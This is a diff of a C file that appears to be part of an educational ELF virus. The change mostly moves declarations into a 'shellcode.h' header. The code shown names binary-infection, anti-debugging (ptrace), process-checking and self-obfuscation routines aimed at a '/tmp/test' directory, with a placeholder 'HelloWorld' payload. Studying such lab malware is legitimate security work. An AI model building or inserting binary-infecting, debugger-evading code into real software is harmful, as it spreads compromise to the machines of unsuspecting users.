@@ -1,40 +1,7 @@
 // TODO Compile every libc functions in a static lib
 static void  start(void) {}
-#define _FCNTL_H
-#define _SYS_MMAN_H
-#include <linux/stat.h>
-#include <stddef.h>
-#include <sys/types.h>
-#include <bits/stat.h>
-#include <bits/fcntl.h>
-#include <bits/mman.h>
-#include <dirent.h>
-#include <elf.h>
 
-/* Architecture dependent */
-enum __ptrace_request {
-  PTRACE_TRACEME = 0,
-  PTRACE_ATTACH = 16
-};
-#define MAP_FAILED	((void *) -1)
-/* Architecture dependent */
-
-#define BUF_SIZE 1024 * 1024 * 5
-#define PAYLOAD "HelloWorld"
-
-static void updateSignature(void);
-static void dynamicSignature(void);
-static void end(void);
-static void lambdaEnd(void);
-static void lambdaStart(void);
-static void encryptStart(void);
-static int  preventDebug(void);
-static size_t strlen(const char *s);
-static int  checkProcess(char *dirname);
-static int  infectBins(const char *dirname);
-static void *memcpy(void *dest, const void *src, size_t);
-static int  unObfuscate(void);
-static int  stop(int status, void *magic);
+#include "shellcode.h"
 
 int   entry_point(void *magic) {
   char    infectDir[] = "/tmp/test";
@@ -117,17 +84,6 @@ static int unObfuscate(void) {
     return (-1);
   return (0);
 }
-
-typedef off_t off64_t;
-typedef ino_t ino64_t;
-
-struct  linux_dirent64 {
-  ino64_t         d_ino;
-  off64_t         d_off;
-  unsigned short  d_reclen;
-  unsigned char   d_type;
-  char            d_name[];
-};
 
 static int  read(int fd, char *buf, size_t count) {
   register ssize_t    rax asm("rax") = 0;
@@ -579,8 +535,6 @@ static void obfuscate(char *header, size_t size) {
     i += 1;
   }
 }
-
-#define MAX_INS_SIZE 12
 
 const char  instructions[][MAX_INS_SIZE] __attribute__ ((section (".text#"))) = {
   "\xcc",
